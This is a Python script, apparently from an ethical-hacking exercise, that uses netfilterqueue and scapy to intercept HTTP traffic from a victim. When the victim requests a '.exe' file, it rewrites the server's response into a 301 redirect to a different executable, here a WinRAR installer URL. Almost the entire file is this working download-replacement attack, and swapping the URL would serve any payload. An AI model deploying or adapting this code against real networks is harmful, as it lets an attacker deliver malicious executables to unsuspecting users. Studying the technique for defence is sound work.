import netfilterqueue
import scapy.all as scapy
import pdb

ack_list = []

def set_load(packet, load):
    #pdb.set_trace()
    print("set_load() START")

    # When the victim try to download a ".exe" file he\she is redirected to this other ".exe" link:
    packet[scapy.Raw].load = load
    # The value of the following fields are changed because the file is changed, they will be removed and
    # scapy automatically recalculate the values of these fields inserting the correct values:
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):

    #print("TEST 1")
    scapy_packet = scapy.IP(packet.get_payload())
    #print("TEST 2")

    # Data sent in HTTP layer are placed in the Raw layer of the scapy packet:
    if scapy_packet.haslayer(scapy.Raw):
        #print("HAS ROW")
        # This a REQUEST: a packet is leaving our computer:
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            # If a ".exe" string is contained in the load field of the Raw layer of the scapy packets
            # it means that the request is related to the download of a ".exe" file:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe download Request")

                # Add the ack (from TCP layer of the scapy packet) of this request (related to a download of
                # an ".exe" file) to the ack_list list:
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print(scapy_packet.show())

        # This is a RESPONSE: a packet is entering in out computer:
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")


            # To understand if this response is the one related to the download of the ".exe" file check if the
            # seq field of the current response (into the TCP layer in the scapy packet) is into the ack_list:
            if scapy_packet[scapy.TCP].seq in ack_list:

                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")

                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar590.exe\n\n")

                # Replace the original packet payload with the packet forget by scapy:
                packet.set_payload(str(modified_packet))


            #print(scapy_packet.show())




    packet.accept()
    #packet.drop()



# Create a queue and bind it to the IPTABLES queue identified with ID=0.
# The process_packet() callback function is associated with this binding. This function will be exectuted for each
# packet dropped in my queue.
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()